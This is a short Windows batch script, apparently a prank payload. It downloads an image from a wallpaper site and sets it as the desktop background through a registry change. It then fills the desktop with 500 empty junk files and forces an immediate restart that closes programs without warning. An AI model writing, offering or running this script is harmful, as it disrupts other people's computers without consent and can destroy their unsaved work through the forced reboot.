@echo off
curl -L "https://mcdn.wallpapersafari.com/medium/35/97/5La6UH.jpg" -o "C:\Users\%USERNAME%\Downloads\5La6UH.jpg"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\%USERNAME%\Downloads\5La6UH.jpg /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
cd C:\Users\%USERNAME%\Desktop
setlocal enabledelayedexpansion
for /l %%i in (1,1,500) do type nul > 67__________________%%i
shutdown /r /f /t 0
